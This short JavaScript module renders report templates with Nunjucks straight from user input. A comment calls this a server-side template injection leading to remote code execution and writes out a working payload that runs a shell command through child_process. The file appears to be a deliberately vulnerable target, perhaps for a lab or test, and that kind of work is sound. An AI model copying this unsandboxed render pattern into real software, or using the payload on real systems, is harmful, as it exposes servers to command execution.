// The report builder renders a report template with Nunjucks over user-supplied
// input -> SSTI RCE (V2):
//   {{range.constructor("return global.process.mainModule.require('child_process').execSync('id')")()}}
const nunjucks = require('nunjucks')
const env = new nunjucks.Environment(null, { autoescape: true })
function render(template, ctx) { return env.renderString(String(template), ctx || {}) }
module.exports = { render }
